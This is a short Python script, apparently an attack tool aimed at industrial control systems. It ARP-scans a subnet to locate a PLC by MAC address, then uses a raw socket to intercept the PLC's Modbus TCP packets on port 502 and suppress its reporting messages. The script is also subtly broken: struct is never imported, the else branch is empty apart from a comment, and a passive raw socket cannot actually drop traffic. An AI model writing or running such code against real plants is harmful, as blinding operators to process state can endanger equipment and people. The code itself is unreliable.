import scapy.all as scapy
import netifaces as ni
import socket
import time

# Function to discover the PLC's IP address
def discover_plc_ip(interface):
    # Send an ARP request to discover devices on the network
    arp_request = scapy.ARP(pdst="192.168.1.0/24")  # Adjust the subnet to match your network
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Filter the responses to find the PLC
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        print(f"Found device: IP={ip}, MAC={mac}")
        # Add your logic to identify the PLC (e.g., based on MAC address or IP)
        if mac == "00:11:22:33:44:55":  # Replace with the actual PLC MAC address
            return ip
    return None

# Function to block reporting messages
def block_reporting_messages(plc_ip):
    # Define the port used by the PLC for reporting messages (e.g., Modbus TCP port 502)
    plc_port = 502

    # Create a raw socket to intercept and drop packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while True:
        # Receive packets
        packet = sock.recvfrom(65535)[0]
        ip_header = packet[0:20]
        iph = struct.unpack('!BBHHHBBH4s4s', ip_header)

        # Extract the source and destination IP addresses
        source_ip = socket.inet_ntoa(iph[8])
        dest_ip = socket.inet_ntoa(iph[9])

        # Extract the TCP header
        tcp_header = packet[20:40]
        tcph = struct.unpack('!HHLLBBHHH', tcp_header)

        # Extract the source and destination ports
        source_port = tcph[0]
        dest_port = tcph[1]

        # Check if the packet is a reporting message from the PLC
        if source_ip == plc_ip and dest_port == plc_port:
            print(f"Blocking reporting message from {source_ip}:{source_port} to {dest_ip}:{dest_port}")
            # Drop the packet by not forwarding it
        else:
            # Forward the packet (optional, for testing purposes)
            # sock.sendto(packet, (dest_ip, dest_port))

# Main function
def main():
    # Get the network interface (e.g., 'eth0')
    interface = 'eth0'  # Replace with your network interface

    # Discover the PLC's IP address
    plc_ip = discover_plc_ip(interface)
    if plc_ip:
        print(f"PLC IP address: {plc_ip}")
        # Block reporting messages
        block_reporting_messages(plc_ip)
    else:
        print("PLC not found on the network")

if __name__ == "__main__":
    main()